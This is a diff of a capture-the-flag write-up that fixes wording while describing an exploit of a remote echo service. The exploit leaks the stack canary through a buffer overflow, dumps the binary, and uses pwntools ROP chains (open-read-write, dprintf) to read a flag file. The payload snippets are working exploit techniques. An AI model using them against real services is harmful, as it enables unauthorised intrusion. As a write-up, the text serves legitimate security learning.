@@ -4,8 +4,7 @@ by *StateOfLimbo* for *coldboots*
 
 ---
 
-I didn't solve this challenge during the CTF. Actually I didn't have time to look at it at all, and it only got 1 solve. I decided to try to solve it afterwards as an exercise before it got spoiled by getting information from the player who solved it or the challenge author.
-
+I didn't solve this challenge during the CTF. Actually I didn't have time to look at it at all, and it only got 1 solve. I decided to try to solve it afterwards as an exercise, before it would get spoiled by information from the player who solved it or the challenge author openly discussing the solution.
 
 ## Challenge Description
 
@@ -39,7 +38,7 @@ input laks en to tre
 $  
 ```
 
-Seems like a service that echo what we type. Then it exits.
+Seems like a service that echoes what we type. Then it exits.
 
 I tried looking for printf vuln.
 
@@ -58,7 +57,7 @@ AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
 ```
 
 It complains about smashing the stack.. meaning that we have a buffer overflow situation, and have overwritten the stack canary.
-By slightly reducing the number of AAAs, I can deduce that I can write 0x48 bytes before overwriting the canary. Also the first (lsb) byte of the canary is always a null byte which terminates our echo output. Luckily by overwriting the null byte the rest of the canary is leaked.
+By slightly reducing the number of AAAs, I deduce that I can write 0x48 bytes before overwriting the canary. Also the first (lsb) byte of the canary is always a null byte which terminates our echo output. Luckily by overwriting the null byte the rest of the canary is leaked.
 
 ```python
 io.sendafter(b'> ', b'A'*0x49)
@@ -76,10 +75,10 @@ io.sendafter(b'> ', b'A'*0x49)
     00000080  64 0a                                               │d·│
 ``` 
 
-The last 7 bytes of the canary @ 0x49 and we also have an stack base pointer leak @0x50.
+The last 7 bytes of the canary is found @ 0x49 and we also have a stack base pointer leak @ 0x50.
 SWEET!
 
-Running the script a second time shows that the canary and stack address stay the same. This leads me to believe that this is a service that is running in a background and spawning new processes to answer network connections. In any case this means that we can leak more of the stack by repeatedly connecting and sending a gradually increasing overflow. So I wrote a script for this, and to parse the results into usable addresses.
+Running the script a second time shows that the canary and stack addresses stay the same. This leads me to believe that we have a service that is running in the background and spawning new processes to handle network connections. In any case this means that we can leak more of the stack by repeatedly connecting and sending a gradually increasing overflow. So I wrote a script to do just that, and to parse the results into usable addresses.
 
 After some trial and error I found a suitable location to stop hammering the service for more stack.
 I'll also cache the results so I don't have to do this every time.
@@ -153,9 +152,9 @@ Output of the stack:
  '0x7ffd9b8bac68']
 ```
 
-I've analysed this in comparison to the stack of other binaries run under ubuntu:22.04 with the same libc, and added comments of the important findings.
+I've analysed the output in comparison to the stack of other binaries run under ubuntu:22.04 with the same libc, and added comments at the important findings.
 
-with the libc address identified, we can calculate the libc base address, but we have not been given the any libc.so.6 file in the challenge. Luckily we can get it from ubuntu 22.04. From another challenge using the same libc, or copying it from a ubuntu 22.04 docker container.
+With a properly identified libc address we can calculate the libc base address, but we have not been given the libc.so.6 file. Luckily we can get it from ubuntu 22.04, from another challenge using the same libc, or copying it from a ubuntu 22.04 docker container.
 
 ```
 [*] canary 0xf639a0bd15599900
@@ -199,7 +198,7 @@ def ret2code(Start, Iterations):
             target = 0x5633e079165c-Start-i
             payload = flat({ 0x48: p64(canary), 0x50: p64(rbp), 0x58: p64(target)})
             io.sendlineafter(b'> ', payload)
-            io.interactive();
+            io.interactive()
             io.close()
         except:
             io.close()
@@ -207,7 +206,7 @@ def ret2code(Start, Iterations):
 
 ## How about a ROP chain
 
-It was at this point I actually copied in the libc from ubuntu 22.04, calculated the libc address base and trying different rop strategies in libc.
+It was at this point I actually copied in the libc from ubuntu 22.04, calculated the libc base address and tried different rop strategies in libc.
 
 ## ROP 2 system("bin/sh") - Nope! wth?
 
@@ -236,7 +235,7 @@ rop.call(rop.ret)
 rop.puts(rbp)
 ```
 
-Tried `write`, and got some output at last when using fd=4. used the leaked rbp minus an offset to try to find the input buffer. After a couple of attempts I found this at offset -0x70
+Tried `write`, and got some output at last when using fd=4. Used the leaked rbp minus an offset to try to find the input buffer. After a couple of attempts I found this at offset -0x70
 (looking for the cyclic pattern "aaaabaaacaaa")
 
 ```
@@ -257,9 +256,9 @@ aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaa\x00Y\x1
 \x00\x96
 ```
 
-## Leak the binary - because Why not!
+## Leak the binary - because Why Not!?
 
-At one point I deduce the start of the executable address space from the leaked RIP, and downloaded the binary piece by piece in 0x800 byte chunks
+At one point I deduced the start of the executable address space from the leaked RIP, and downloaded the binary piece by piece in 0x800 byte chunks
 
 ```python
 rop.write(4,exe_base, 0x100)
@@ -278,16 +277,16 @@ Here's some disassembly.
 
 This didn't give me much, unfortunately.
 
-I also found a string I used for dhe `%d` at `exe_base + 0x2080`
+I did find a string I later used for the `%d` at `exe_base + 0x2080`
 
 ![printf](string.png)
 
 ## The actual solve
 
 I finally tried to do a ropchain with open - read - write .
-But I didn't know which FD would be returned from open(), and I didn't assume it would be on FD 3, So I wrote a chain to find out.
+But I didn't know which FD would be returned from open(), and I didn't want to assume it would be on FD 3, So I wrote a chain to find out.
 
-using a gadget with "xcgh eax, edx" to put the returned FD into the right register for `dprintf`, and the string with `%d` from the leaked executable I got the following chain:
+Used a gadget with "xchg eax, edx" to put the returned FD into the right register for `dprintf` and the string with `%d` from the leaked executable to get the following chain:
 
 ```python
 rop.open(buffer,0)
@@ -306,7 +305,7 @@ Output:
 /opt/flag[*] connection received on socket 3
 ```
 
-I should have just assumed ... At least I got to learn about `dprintf` which does printf formatting to a file descriptor. And got to practive searching for the proper xchg-gadget.. Good times!
+Forget the "connection received on socket" part,, It's the %d that prints out file descriptor.. And it is `3`! I should have just assumed ... At least I got to learn about `dprintf` which does printf formatting to a file descriptor. And got to practice searching for the proper xchg-gadget.. Good times!
 
 ## The actual actual solve continues
 
